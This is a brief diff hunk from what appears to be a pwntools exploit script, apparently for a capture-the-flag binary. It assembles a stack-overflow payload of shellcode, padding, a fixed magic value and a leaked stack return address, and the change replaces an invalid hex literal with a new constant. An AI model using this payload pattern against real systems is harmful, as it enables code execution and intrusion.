@@ -19,7 +19,7 @@ log.info('stack: ' + hex(stack))
 
 payload += shellcode
 payload += (0x128 - len(payload) - 0xc) * b'C'
-payload += p32(0xe3qee00d)
+payload += p32(0xb16b00b5)
 payload += (0x128 - len(payload)) * b'D'
 payload += p64(stack)
 
